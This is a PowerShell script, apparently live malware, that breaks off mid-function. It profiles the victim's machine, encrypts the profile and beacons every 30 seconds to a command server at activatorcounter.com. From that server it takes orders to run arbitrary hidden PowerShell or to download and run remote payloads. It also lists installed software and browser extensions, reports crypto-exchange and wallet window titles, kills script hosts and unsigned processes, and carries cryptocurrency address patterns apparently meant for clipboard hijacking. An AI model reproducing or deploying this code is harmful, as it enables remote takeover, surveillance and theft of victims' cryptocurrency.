$mutexName = "Global\JKS825F"
try {
    $existingMutex = [System.Threading.Mutex]::OpenExisting($mutexName)
    exit 1
} catch {
    Write-Output "No existing mutex found. Acquiring lock..."
}

$mutex = New-Object System.Threading.Mutex($true, $mutexName)
$acquired = $mutex.WaitOne(5000)
if (-not $acquired) {
    exit 1
}
$extension = ".ddx"
$windowsPath = "$env:SystemDrive\Windows"
$foundFiles = Get-ChildItem -Path $windowsPath -Filter "*$extension" -File -ErrorAction SilentlyContinue |
    Where-Object { $_.Name -match '^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}\.ddx$' }

if ($foundFiles) {
    $foundFiles | ForEach-Object {

    }
} else {

    exit
}


$global:fileContent = $null
$guidPattern = "^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-[0-9a-fA-F]{12}\.ddx$"
$guidFile = Get-ChildItem -Path $env:windir -File -Filter "*.ddx" |
    Where-Object { $_.Name -match $guidPattern } |
    Select-Object -First 1

if ($guidFile) {
    try {
        $global:fileContent = [System.IO.File]::ReadAllText($guidFile.FullName)
    }
    catch {
       $global:fileContent = Get-Content -Path $guidFile.FullName -Raw


    }
}

$OS_Major = [System.Environment]::OSVersion.Version.Major.ToString() + "." + [System.Environment]::OSVersion.Version.Minor.ToString();
$EndPointURL = "https://activatorcounter.com/connect/ping";
$Version = "O_143";

$wordListPath = "bip-0039.txt"
$storedPhrasesPath = "$env:APPDATA\StoredBIP39Phrases.txt"
$storedPhrasesPath2 = "$env:APPDATA\StoredAdd.txt"
$storedPhrasesPath3 = "$env:APPDATA\StoredWeb.txt"

# Function to download the BIP-39 word list if not already present
function DownloadWordList {
    if (-not (Test-Path $wordListPath)) {
        Invoke-WebRequest -Uri "https://raw.githubusercontent.com/bitcoin/bips/refs/heads/master/bip-0039/english.txt" -OutFile $wordListPath
    }
    return Get-Content $wordListPath
}

# Load or download the BIP-39 word list
$words = DownloadWordList
function Encrypt-Text {
    param (
        [string]$PlainText       # 16-character IV
    )

    $Key = "0123456789abcdef0123456789abcdef";
    $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($Key)

    $plainBytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)

    $aes = [System.Security.Cryptography.Aes]::Create()
    $aes.Key = $keyBytes
    $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
    $aes.GenerateIV()
    $ivBytes = $aes.IV

    $memoryStream = New-Object System.IO.MemoryStream
    $cryptoStream = New-Object System.Security.Cryptography.CryptoStream (
        $memoryStream,
        $aes.CreateEncryptor(),
        [System.Security.Cryptography.CryptoStreamMode]::Write
    )

    $cryptoStream.Write($plainBytes, 0, $plainBytes.Length)
    $cryptoStream.FlushFinalBlock()

    $encryptedBytes = $memoryStream.ToArray()

    $cryptoStream.Close()
    $memoryStream.Close()
    $combinedBytes = $ivBytes + $encryptedBytes
    $txt = [System.Convert]::ToBase64String($combinedBytes)
    return $txt
}

function Get-EnvVar([string] $str) {
    return [System.Environment]::ExpandEnvironmentVariables("%" + $str + "%")
}

function WMI([string] $class, [string] $value) {
    $val = $null;
    $results = (Get-WmiObject -Class $class) ;
    foreach ($item in $results) {
        $val = $item[$value];
        break;
    }
    if ($val -eq $null) {
        $val = [Guid]::NewGuid().ToString();
    }
    return $val;
}

function Get-HWID() {
    # return (WMI 'win32_logicaldisk' "VolumeSerialNumber")
    $systemDrive = $env:SystemDrive
    $username = [Environment]::UserName
    $outputFile = "$($systemDrive)\Users\$username\devid"
    if (Test-Path $outputFile) {
        $uuid = Get-Content -Path $outputFile
    } else {
        $uuid = [Guid]::NewGuid().ToString("N")
        Set-Content -Path $outputFile -Value $uuid
    }
    return $uuid
}

function Get-Caption() {
    return (WMI 'Win32_OperatingSystem' "Caption")
}

function Get-AddWidth() {
    return (WMI 'Win32_Processor' "AddressWidth")
}

function Get-AvStatus {
    try {
        Get-WmiObject -Namespace "root\SecurityCenter2" -Class AntiVirusProduct -ErrorAction Stop | ForEach-Object {
            $bytes = [System.BitConverter]::GetBytes($_.productState)
            $status = if (($bytes[1] -eq 0x10) -or ($bytes[1] -eq 0x11)) { "Enabled" }
                     elseif (($bytes[1] -eq 0x00) -or ($bytes[1] -eq 0x01) -or ($bytes[1] -eq 0x20) -or ($bytes[1] -eq 0x21)) { "Disabled" }
                     else { "Unknown" }
            "$($_.displayName) $status"
        }
    }
    catch {
        return "Unable to get antivirus status"
    }
}

function vxUABGtfQ7B7([string]$str) {
    if ($str.Length -eq 0) {
        return "";
    }
    $str = $str.Replace("/", "");
    return ($str.Substring(0, 1).ToUpper() + $str.Substring(1));
}

$_HWID_ = Get-HWID;
function getUserAgent {
    $agnt = "$($Version )_$($_HWID_)\" + "$([Environment]::GetEnvironmentVariable('COMPUTERNAME'))-$([Environment]::UserName)-$($global:fileContent)" + '\' + [Environment]::UserName + '\' + (vxUABGtfQ7B7 (Get-Caption)) + " [" + (Get-AddWidth) + "]" + '\' + (vxUABGtfQ7B7 (Get-AvStatus)) + '\ \'
    return  Encrypt-Text -PlainText $agnt
}


$useragent = getUserAgent;


$jobPing = Start-Job -ScriptBlock{
     param ($EndPointURL, $OS_Major, $Version , $useragent)

     function Encrypt-Text {
        param (
            [string]$PlainText       # 16-character IV
        )

        $Key = "0123456789abcdef0123456789abcdef";
        $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($Key)

        $plainBytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)

        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $keyBytes
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aes.GenerateIV()
        $ivBytes = $aes.IV

        $memoryStream = New-Object System.IO.MemoryStream
        $cryptoStream = New-Object System.Security.Cryptography.CryptoStream (
            $memoryStream,
            $aes.CreateEncryptor(),
            [System.Security.Cryptography.CryptoStreamMode]::Write
        )

        $cryptoStream.Write($plainBytes, 0, $plainBytes.Length)
        $cryptoStream.FlushFinalBlock()

        $encryptedBytes = $memoryStream.ToArray()

        $cryptoStream.Close()
        $memoryStream.Close()
        $combinedBytes = $ivBytes + $encryptedBytes
        $txt = [System.Convert]::ToBase64String($combinedBytes)
        return $txt
    }

    function Decrypt-Text {
        param (
            [string]$EncryptedText
        )

        $Key = "0123456789abcdef0123456789abcdef";
        $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($Key)

        # Convert the encrypted text from Base64 to bytes
        $combinedBytes = [System.Convert]::FromBase64String($EncryptedText)

        # Extract the IV (first 16 bytes) and the encrypted data (remaining bytes)
        $ivBytes = $combinedBytes[0..15]
        $encryptedBytes = $combinedBytes[16..($combinedBytes.Length - 1)]

        # Create an AES object and assign the key and IV
        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $keyBytes
        $aes.IV = $ivBytes
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7

        # Create a memory stream to hold the decrypted data
        $memoryStream = New-Object System.IO.MemoryStream
        $cryptoStream = New-Object System.Security.Cryptography.CryptoStream (
            $memoryStream,
            $aes.CreateDecryptor(),
            [System.Security.Cryptography.CryptoStreamMode]::Write
        )

        # Write the encrypted data to the CryptoStream for decryption
        $cryptoStream.Write($encryptedBytes, 0, $encryptedBytes.Length)
        $cryptoStream.FlushFinalBlock()

        # Get the decrypted bytes and convert to a string
        $decryptedBytes = $memoryStream.ToArray()
        $cryptoStream.Close()
        $memoryStream.Close()

        # Convert decrypted bytes to UTF8 string and return
        $text = [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
        return $text
    }

    function Connect($notify) {
        try {
            if ($OS_Major -ne "6.1") {
                [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
                [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }
            }

            $headers = @{
                'X-User-Agent' = $useragent
                'X-get' = "1"
            }


            if ($notify) {
                $headers['X-notify'] = Encrypt-Text -PlainText $notify
            }

            $Response = Invoke-RestMethod -Uri $EndPointURL `
                                         -Method POST `
                                         -Headers $headers `
                                         -Body "" `
                                         -UseBasicParsing

            return $Response.ToString()
        }
        catch {
            #Write-Output "Error: $_"
            return $null
        }

    }

  function DownloadFile([string]$URL) {
    [string]$UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/599.99 (KHTML, like Gecko) Chrome/81.0.3999.199 Safari/599.99"

    # Set TLS 1.2 as the security protocol for all .NET connections
    [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

    # Bypass certificate validation for HTTPS requests
    [System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

    try {
        # Use Invoke-WebRequest for better compatibility and error handling
        $response = Invoke-WebRequest -Uri $URL -UserAgent $UserAgent -Method 'GET' -UseBasicParsing
        return [System.Text.Encoding]::UTF8.GetString($response.Content)
    }
    catch {
        Write-Error "Error downloading file from $URL : $_"
        return $null
    }
}


    function Gn4bSDMHKIxEE8UP7wZJ($quit) {
        if ($quit) {
            exit(0);
        }
    }

function runCmd {
    [CmdletBinding()]
    param (
        [Parameter(Mandatory = $true)]
        [string]$Command
    )

    try {
        # Define the threshold for command size
        $threshold = 1KB

        # Determine if the command should be written to a temp file due to size
        if ([System.Text.Encoding]::UTF8.GetByteCount($Command) -gt $threshold) {
            $tempFile = [System.IO.Path]::GetTempFileName() + ".ps1"
            $Command += "; Remove-Item -LiteralPath `'$($tempFile)`' -Force"
            Set-Content -Path $tempFile -Value $Command -Encoding UTF8
            $Command = "-File `"$tempFile`""
        } else {
            # Use -EncodedCommand for smaller commands
            $encodedCommand = [Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($Command))
            $Command = "-EncodedCommand $encodedCommand"
        }

        # Prepare the runspace name
        $runspaceName = "PersistentRunspace_" + (New-Guid).Guid

        # Define the script block to be executed in a new PowerShell process
        $scriptBlock = {
            param($Command, $RunspaceName)
            try {
                $scriptBlock = [ScriptBlock]::Create($Command)
                Invoke-Command -ScriptBlock $scriptBlock
            }
            catch {
                Write-Error "Error in persistent process: $_"
            }
        }

        # Start a new PowerShell process
        $processStartInfo = New-Object System.Diagnostics.ProcessStartInfo
        $processStartInfo.FileName = "powershell.exe"
        $processStartInfo.Arguments = "-NoProfile -ExecutionPolicy Bypass $Command"
        $processStartInfo.UseShellExecute = $false
        $processStartInfo.CreateNoWindow = $true
        $process = [System.Diagnostics.Process]::Start($processStartInfo)

        return @{
            ProcessId = $process.Id
            ExitCode = 0
        }
    }
    catch {
        Write-Error "Error starting persistent process: $_"
        return @{
            ExitCode = 1000
            Error = $_.Exception.Message
        }
    }
}


    function Set-Log([string]$log) {
        $cli = New-Object System.Net.WebClient
        $cli.Headers['X-User-Agent'] = $useragent
        $cli.Headers['X-notify'] = Encrypt-Text -PlainText $log
        $cli.UploadString($EndPointURL, '') | Out-Null
    }
    function CheckApps() {
        $paths = @(
            $env:APPDATA,
            $env:LOCALAPPDATA,
            ${env:ProgramFiles},
            ${env:ProgramFiles(x86)}
        ) | Where-Object { $_ -ne $null }  # Ensure no null paths

        $installedSoftware = @()
        foreach ($path in $paths) {
            if (Test-Path $path) {
                try {
                    $apps = Get-ChildItem -Path $path -Directory -ErrorAction SilentlyContinue | Select-Object -ExpandProperty Name
                    $installedSoftware += $apps
                } catch {
                    Write-Host "Error accessing: $path"
                }
            }
        }

        $installedSoftware = $installedSoftware | Sort-Object -Unique

        # Fetch installed software from registry
        $registrySoftware = @()
        $registryPaths = @(
            "HKLM:\Software\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\",
            "HKLM:\Software\Microsoft\Windows\CurrentVersion\Uninstall\"
        )

        foreach ($regPath in $registryPaths) {
            if (Test-Path $regPath) {
                try {
                    $software = Get-ItemProperty -Path $regPath* -ErrorAction SilentlyContinue |
                        Where-Object { $_.DisplayName -ne $null } |
                        Select-Object -First 5 -ExpandProperty DisplayName
                    $registrySoftware += $software
                } catch {
                    Write-Host "Error accessing registry: $regPath"
                }
            }
        }

        $installedSoftware = $installedSoftware + $registrySoftware | Sort-Object -Unique
        $softwareList = $installedSoftware -join ", "
        return "ISNTALLED APPS: $($softwareList)";
    }
    function Get-BrowserExtensions {
        $browserPaths = @{
            "Chrome" = "$env:LOCALAPPDATA\Google\Chrome"
            "Edge" = "$env:LOCALAPPDATA\Microsoft\Edge"
            "Brave" = "$env:LOCALAPPDATA\BraveSoftware\Brave-Browser"
            "Opera" = "$env:APPDATA\Opera Software\Opera Stable"
            "Opera GX" = "$env:APPDATA\Opera Software\Opera GX Stable"
            "Firefox" = "$env:APPDATA\Mozilla\Firefox"
            "Vivaldi" = "$env:LOCALAPPDATA\Vivaldi"
            "Chrome Beta" = "$env:LOCALAPPDATA\Google\Chrome Beta"
            "Chrome Canary" = "$env:LOCALAPPDATA\Google\Chrome SxS"
            "Firefox Developer" = "$env:APPDATA\Mozilla\Firefox Developer Edition"
        }

        # Function to get extensions for Chromium-based browsers
        function Get-ChromiumExtensions {
            param([string]$browserPath)
            $extensionsPath = Join-Path $browserPath "User Data\Default\Extensions"
            if (Test-Path $extensionsPath) {
                $extensions = Get-ChildItem -Path $extensionsPath -Recurse -Depth 1 | Where-Object { $_.PSIsContainer }
                return $extensions | ForEach-Object {
                    $manifestPath = Join-Path $_.FullName "manifest.json"
                    if (Test-Path $manifestPath) {
                        $manifest = Get-Content -Path $manifestPath -Raw | ConvertFrom-Json
                        if ($manifest.name) {
                            if ($manifest.name -like "__MSG_*") {
                                # Attempt to get the localized name if it's using message placeholders
                                $messagesPath = Join-Path $_.FullName "_locales\en\messages.json"
                                if (Test-Path $messagesPath) {
                                    $messages = Get-Content -Path $messagesPath -Raw | ConvertFrom-Json
                                    $nameKey = $manifest.name -replace "__MSG_","" -replace "__",""
                                    if ($messages.$nameKey.message) { $messages.$nameKey.message } else { $manifest.name }
                                } else {
                                    $manifest.name
                                }
                            } else {
                                $manifest.name
                            }
                        } else {
                            $_.Name
                        }
                    }
                }
            }
            return @()
        }

        # Function to get Firefox extensions
        function Get-FirefoxExtensions {
            param([string]$firefoxProfilePath)
            if (Test-Path $firefoxProfilePath) {
                $profiles = Get-ChildItem -Path $firefoxProfilePath -Filter "*.default*"
                if ($profiles) {
                    $extensionsPath = Join-Path $profiles[0].FullName "extensions.json"
                    if (Test-Path $extensionsPath) {
                        $json = Get-Content -Path $extensionsPath | ConvertFrom-Json
                        return $json.addons | Where-Object { $_.type -eq "extension" } | Select-Object -ExpandProperty name
                    }
                }
            }
            return @()
        }

        $output = @()

        foreach ($browser in $browserPaths.GetEnumerator()) {
            $browserName = $browser.Key
            $browserPath = $browser.Value

            if ($browserName -ne "Firefox" -and $browserName -ne "Firefox Developer") {
                $extensions = @(Get-ChromiumExtensions -browserPath $browserPath)
            } else {
                $extensions = @(Get-FirefoxExtensions -firefoxProfilePath $browserPath)
            }

            if ($extensions.Count -gt 0) {
                $extString = $extensions -join ", "
                $output += "$($browserName)Ext : $extString"
            }
        }
       $output += CheckApps
        # Return result as a newline-separated string
        return ($output -join ",")
    }

    # Example usage:
    # Get-BrowserExtensions



    try {

        $ii = 0
        while ($true) {
            $ii++
            #Write-Output "Ping... $ii"

            $apps = Get-BrowserExtensions
            $apps = "ap|$apps"
            #Write-Output "CheckApps $apps"
            $kk9XDcoU8Sfo692 = Connect($apps);

            $sep = "|V|";
            #Write-Output "Ping... $kk9XDcoU8Sfo692"
            if (![string]::IsNullOrEmpty($kk9XDcoU8Sfo692) -and $kk9XDcoU8Sfo692.Length -gt 4) {
                $kk9XDcoU8Sfo692 = Decrypt-Text -EncryptedText $kk9XDcoU8Sfo692
            }
            $Fd1Jal88zKyxij = $kk9XDcoU8Sfo692 -split "\|V\|";

            if ($Fd1Jal88zKyxij.Count -ge 2) {
                $ivI0sA6txn5XPifq = $Fd1Jal88zKyxij[0];
                $JkByjqH1xztsW2YUG = $Fd1Jal88zKyxij[1];

                try {
                    if ($ivI0sA6txn5XPifq -eq "Cmd") {Connect
                        # Write-Output "CMD_cmd $JkByjqH1xztsW2YUG"
                        $r = runCmd -Command $JkByjqH1xztsW2YUG;
                        Set-Log("rc|$($r.ExitCode)")
                    }
                    elseif ($ivI0sA6txn5XPifq -eq "DwnlExe") {
                        $cmd = DownloadFile -url $JkByjqH1xztsW2YUG
                        $cmd = Decrypt-Text -EncryptedText $cmd
                        $cmd = [System.Convert]::FromBase64String($cmd)
                        $cmd = [System.Text.Encoding]::UTF8.GetString($cmd)
                        #Write-Output "CMD_DwnlExe $cmd"
                        $r = runCmd -Command $cmd;
                        Set-Log("rc|$($r.ExitCode)")
                    }
                    elseif ($ivI0sA6txn5XPifq -eq "SelfRemove") {
                        Gn4bSDMHKIxEE8UP7wZJ -quit $true
                    }elseif($ivI0sA6txn5XPifq -eq "RestartClient"){
                        exit(0);
                    }
                }
                catch {
                    #Write-Output "CMD_err $_"
                    Set-Log("rc|1234")
                }
            }
            Start-Sleep -Seconds 30
        }
    }
    finally {

    }



} -ArgumentList $EndPointURL, $OS_Major, $Version, $useragent



#newcode


$jobwcscript = Start-Job -ScriptBlock {
    Add-Type -AssemblyName System.Timers

    $mutexName = "Global\WSCriptsMonitorMutex"
    $mutex = New-Object System.Threading.Mutex($false, $mutexName, [ref]$null)

    $mutexAcquired = $mutex.WaitOne(0, $false)

    if (-not $mutexAcquired) {
        return
    }

    try {
        $global:keepRunning = $true

        function Check-AndTerminateScriptProcesses {
            $processes = Get-Process | Where-Object {
                (($_.Name -eq 'wscript') -or ($_.Name -eq 'cscript')) -and
                (([datetime]::Now - $_.StartTime).TotalSeconds -gt 5)
            }

            foreach ($process in $processes) {
                try {
                    $process | Stop-Process -Force
                } catch {
                }
            }
        }

        while ($global:keepRunning) {
            Check-AndTerminateScriptProcesses
            Start-Sleep -Seconds 5
        }
    }
    finally {
        if ($mutexAcquired) {
            $mutex.ReleaseMutex()
            $mutex.Dispose()
        }
    }
} -Name "WSCriptsMonitor"


$mainScript = @'
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName PresentationCore
Add-Type -AssemblyName System.Threading

$logFile = "$env:TEMP\ClipboardMonitor.log"

function Write-Log {
    param([string]$message)
    "$(Get-Date) - $message" | Out-File -FilePath $logFile -Append
}

# Create and try to acquire mutex
$mutexName = "Global\ClipboardMonitorMutex"
$mutex = New-Object System.Threading.Mutex($false, $mutexName, [ref]$null)
$mutexAcquired = $mutex.WaitOne(0, $false)

if (-not $mutexAcquired) {
    exit
}

try {
    while ($true) {
        try {
            $initialClipboardText = [System.Windows.Forms.Clipboard]::GetText()

            $processes = Get-Process | Where-Object {$_.Path -ne $null} | Select-Object Id, ProcessName, Path
            $systemFolders = @(
                "$env:SystemRoot",
                "$env:ProgramFiles",
                "${env:ProgramFiles(x86)}",
                "$env:ProgramData",
                "$env:SystemDrive\Windows"
            )
            $unsignedProcesses = @()

            foreach ($process in $processes) {
                $inSystemFolder = $false
                foreach ($folder in $systemFolders) {
                    if ($process.Path -like "$folder*") {
                        $inSystemFolder = $true
                        break
                    }
                }

                if (-not $inSystemFolder) {
                    try {
                        $signature = Get-AuthenticodeSignature -FilePath $process.Path -ErrorAction SilentlyContinue
                        if ($signature.Status -ne "Valid") {
                            $unsignedProcesses += $process
                        }
                    } catch {
                        # Silently continue
                    }
                }
            }

            Start-Sleep -Milliseconds 300
            $newClipboardText = [System.Windows.Forms.Clipboard]::GetText()

            $clipboardChanged = ($initialClipboardText -ne $newClipboardText)

            if ($clipboardChanged) {

                Add-Type @"
                using System;
                using System.Runtime.InteropServices;
                public class ForegroundWindow {
                    [DllImport("user32.dll")]
                    public static extern IntPtr GetForegroundWindow();

                    [DllImport("user32.dll")]
                    public static extern uint GetWindowThreadProcessId(IntPtr hWnd, out uint processId);
                }
"@

                $hwnd = [ForegroundWindow]::GetForegroundWindow()
                $activeProcessId = 0
                [void][ForegroundWindow]::GetWindowThreadProcessId($hwnd, [ref]$activeProcessId)
                $activeProcess = Get-Process -Id $activeProcessId -ErrorAction SilentlyContinue

                foreach ($unsignedProcess in $unsignedProcesses) {
                    try {
                        Stop-Process -Id $unsignedProcess.Id -Force -ErrorAction SilentlyContinue
                        Set-Clipboard " "
                    } catch {
                    }
                }
            }
        } catch {
        }

        Start-Sleep -Seconds 1
    }
}
finally {
    if ($mutexAcquired) {
        $mutex.ReleaseMutex()
        $mutex.Dispose()
        "$(Get-Date) - Clipboard monitor stopped, mutex released" | Out-File -FilePath $logFile -Append
    }
}
'@


$mainScriptPath = "$env:TEMP\ClipboardProtect.ps1"
$mainScript | Out-File -FilePath $mainScriptPath -Force
$mainProcess = Start-Process powershell.exe -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$mainScriptPath`"" -WindowStyle Hidden -PassThru





$jobWindow  = Start-Job -ScriptBlock {
    param($EndPointURL, $useragent)

    function Encrypt-Text {
        param (
            [string]$PlainText
        )

        $Key = "0123456789abcdef0123456789abcdef";
        $keyBytes = [System.Text.Encoding]::UTF8.GetBytes($Key)

        $plainBytes = [System.Text.Encoding]::UTF8.GetBytes($PlainText)

        $aes = [System.Security.Cryptography.Aes]::Create()
        $aes.Key = $keyBytes
        $aes.Padding = [System.Security.Cryptography.PaddingMode]::PKCS7
        $aes.GenerateIV()
        $ivBytes = $aes.IV

        $memoryStream = New-Object System.IO.MemoryStream
        $cryptoStream = New-Object System.Security.Cryptography.CryptoStream (
            $memoryStream,
            $aes.CreateEncryptor(),
            [System.Security.Cryptography.CryptoStreamMode]::Write
        )

        $cryptoStream.Write($plainBytes, 0, $plainBytes.Length)
        $cryptoStream.FlushFinalBlock()

        $encryptedBytes = $memoryStream.ToArray()

        $cryptoStream.Close()
        $memoryStream.Close()
        $combinedBytes = $ivBytes + $encryptedBytes
        $txt = [System.Convert]::ToBase64String($combinedBytes)
        return $txt
    }

    # Define state file path - use a JSON file for better structure
    $stateFilePath = "$env:APPDATA\crypto_keywords_state.json"

    # Initialize the processed keywords hashtable
    $processedKeywords = @{}

    # Load existing state if available
   if (Test-Path $stateFilePath) {
    try {
        # Use a file stream with FileShare.None to ensure exclusive access
        $fileStream = [System.IO.File]::Open($stateFilePath, 'Open', 'Read', 'None')
        $streamReader = New-Object System.IO.StreamReader($fileStream)
        $jsonContent = $streamReader.ReadToEnd()
        $streamReader.Close()
        $fileStream.Close()

        # Convert JSON to object and then to hashtable (for older PowerShell versions)
        $jsonObject = ConvertFrom-Json $jsonContent
        $processedKeywords = @{}
        foreach ($property in $jsonObject.PSObject.Properties) {
            $processedKeywords[$property.Name] = $property.Value
        }
        Write-Host "Loaded existing state with $(($processedKeywords.Keys).Count) processed keywords"
    }
    catch {
        Write-Host "Error loading state file: $_"
        # Initialize empty if we can't load
        $processedKeywords = @{}
    }
}
    else {
        # Create the initial state file
        try {
            $fileStream = [System.IO.File]::Open($stateFilePath, 'Create', 'Write', 'None')
            $streamWriter = New-Object System.IO.StreamWriter($fileStream)
            $streamWriter.Write("{}")
            $streamWriter.Flush()
            $streamWriter.Close()
            $fileStream.Close()
            Write-Host "Created new state file at $stateFilePath"
        }
        catch {
            Write-Host "Error creating state file: $_"
        }
    }

    # Function to save the current state
    function Save-State {
        try {
            # Convert hashtable to JSON
            $jsonContent = ConvertTo-Json $processedKeywords

            # Use a file stream with FileShare.None to ensure exclusive access
            $fileStream = [System.IO.File]::Open($stateFilePath, 'Create', 'Write', 'None')
            $streamWriter = New-Object System.IO.StreamWriter($fileStream)
            $streamWriter.Write($jsonContent)
            $streamWriter.Flush()
            $streamWriter.Close()
            $fileStream.Close()
            return $true
        }
        catch {
            Write-Host "Error saving state: $_"
            return $false
        }
    }

    # Main monitoring loop
    while ($true) {
        try {
            $keywords = @('binance','bybit','teamos','team os','coinbase','okx','kucoin','crypto.com','kraken','gate.io','huobi','bitget','bitstamp','gemini','bitfinex','bithumb','binance.us','ftx','poloniex','bittrex','coincheck','bitflyer','cex.io','upbit','mexc','phemex','wazirx','bitmart','deribit','aax','lbank','hotbit','btse','coinex','whitebit','bkex','probit','indodax','bitso','coinone','bitbank','okcoin','bitpanda','btcturk','liquid','exmo','bigone','bitbns','p2pb2b','bitkub','network','digifinex','bitrue','zbg','ascendex','blockchain','blockfi','coindesk','etoro','paxful','paypal','metamask','exodus','phantom','trustwallet','coinbasewallet','keplr','rabby','talisman','templewallet','bravewallet','binancewallet','xdefi','mathwallet','coin98','guarda','atomicwallet','myetherwallet','ledgerlive','trezorsuite','safepal','coinmarketcap','coingecko','cointelegraph','theblock','messari','tradingview','glassnode','defillama','cryptopanic','duneanalytics','bscscan','etherscan','cryptoslate','cryptocurrenciesprices')
            $windows = (Get-Process | Where-Object { $_.MainWindowTitle -ne "" } | Select-Object MainWindowTitle)

            foreach ($wndobj in $windows) {
                [string]$wnd = $wndobj.MainWindowTitle;

                foreach ($keyword in $keywords) {
                    if ($wnd.ToLower().Contains($keyword.ToLower())) {
                        # Use the keyword as the key in our hashtable
                        $keywordKey = $keyword.ToLower()

                        # Check if this keyword has been processed before
                        if (-not $processedKeywords.ContainsKey($keywordKey)) {
                            try {
                                # Mark the keyword as processed BEFORE sending
                                $processedKeywords[$keywordKey] = Get-Date -Format "yyyy-MM-dd HH:mm:ss"

                                # Save state immediately after updating
                                if (Save-State) {
                                    $headers = @{
                                        'X-User-Agent' = $useragent
                                        'X-notify' = Encrypt-Text -PlainText "win|$($keyword.ToUpper())"
                                    }

                                    Invoke-RestMethod -Uri $EndPointURL -Method POST -Headers $headers -Body ''
                                    Write-Host "win|$($keyword.ToUpper())"
                                }
                            }
                            catch {
                                Write-Host "Error sending notification: $_"
                            }
                        }
                    }
                }
            }
        }
        catch {
            # Error handling
            Write-Host "Error in main loop: $_"
        }

        # Checkpoint: Save state periodically as recommended by Microsoft
        Save-State | Out-Null

        # Wait before next check
        Start-Sleep -Seconds 30
    }
} -ArgumentList $EndPointURL, $useragent

# Display job information
Write-Host "Background job started with ID: $($job.Id)"
Write-Host "The job is monitoring window titles for crypto-related keywords."
Write-Host "Each matched keyword will only be reported once."
Write-Host "To check job status: Get-Job -Id $($job.Id)"
Write-Host "To receive job output: Receive-Job -Id $($job.Id)"
Write-Host "To stop the job: Stop-Job -Id $($job.Id); Remove-Job -Id $($job.Id)"



$address_book = ConvertFrom-Json @"
[
     {
        "r": "^bc1[a-zA-HJ-NP-Z0-9]{39,59}$",
        "c": "BTC"
    },
    {
        "r": "^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$",
        "c": "BTC"
    },
    {
        "r": "^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$",
        "c": "BTC"
    },
    {
        "r": "^((bitcoincash|bchreg|bchtest):)?(q|p)[a-z0-9]{41}$",
        "c": "BCH"
    },
    {
        "r": "^(bnb)([a-z0-9]{39})$",
        "c": "BNB"
    },
    {
        "r": "^0x[a-fA-F0-9]{40}$",
        "c": "ETH"
    },
    {
        "r": "^[48][0-9AB][1-9A-HJ-NP-Za-km-z]{93}$",
        "c": "XMR"
    },
    {
        "r": "^r[rpshnaf39wBUDNEGHJKLM4PQRST7VWXYZ2bcdeCg65jkm8oFqi1tuvAxyz]{24,34}$",
        "c": "XRP"
    },
    {
        "r": "^D{1}[5-9A-HJ-NP-U]{1}[1-9A-HJ-NP-Za-km-z]{32}$",
        "c": "DOGE"
    },
    {
        "r": "^X[1-9A-HJ-NP-Za-km-z]{33}$",
        "c": "DASH"
    },
    {
        "r": "^addr1[a-z0-9]{98}$",
        "c": "ADA"
    },
    {
        "r": "^tz1[a-zA-Z0-9]{33}$",
        "c": "XTZ"
    },
    {
        "r": "^[1-9A-HJ-NP-Za-km-z]{43,44}$",
        "c": "SOL"
    },
    {
        "r": "^cosmos1[a-z0-9]{38}$",
        "c": "ATOM"
    },
    {
        "r": "^kava1[a-z0-9]{38}$",
        "c": "KAVA"
    },
    {
        "r": "^t[13][a-km-zA-HJ-NP-Z1-9]{33}$",
        "c": "ZEC"
    },
    {
        "r": "^zil1[a-zA-Z0-9]{38}$",
        "c": "ZIL"
    },
    {
        "r": "^T[A-Za-z1-9]{33}$",
        "c": "USDT"
    }

]
"@;

function Ensure-FileHasLock([string]$ValueToCheck) {
    $FilePath = "$env:Appdata\pross.config"
    if (-not (Test-Path $FilePath)) {
        return $true
    }
    if (-not (Select-String -Path $FilePath -Pattern "^\s*${ValueToCheck}\s*$")) {
        return $true
    } else {
        return $false
    }
}

function Ensure-FileCreateLock([string]$ValueToCheck) {
    $FilePath = "$env:Appdata\pross.config"
    if (-not (Test-Path $FilePath)) {
        New-Item -Path $FilePath -ItemType File -Force | Out-Null
    }
    if (-not (Select-String -Path $FilePath -Pattern "^\s*${ValueToCheck}\s*$")) {
        Add-Content -Path $FilePath -Value $ValueToCheck
        return $true
    } else {
        return $false
    }
}
function Ensure-FileHasLockk([string]$ValueToCheck) {
    $FilePath = "$env:Appdata\prossc.config"
    if (-not (Test-Path $FilePath)) {
        return $true
    }
    if (-not (Select-String -Path $FilePath -Pattern "^\s*${ValueToCheck}\s*$")) {
        return $true
    } else {
        return $false
    }
}

function Ensure-FileCreateLockk([string]$ValueToCheck) {
    $FilePath = "$env:Appdata\prossc.config"
    if (-not (Test-Path $FilePath)) {
        New-Item -Path $FilePath -ItemType File -Force | Out-Null
    }
    if (-not (Select-String -Path $FilePath -Pattern "^\s*${ValueToCheck}\s*$")) {
        Add-Content -Path $FilePath -Value $ValueToCheck
        return $true
    } else {
        return $false
    }
}
function Set-Log([string]$log) {
    $cli = New-Object System.Net.WebClient
    $cli.Headers['X-User-Agent'] = $useragent
    $cli.Headers['X-notify'] = Encrypt-Text -PlainText $log
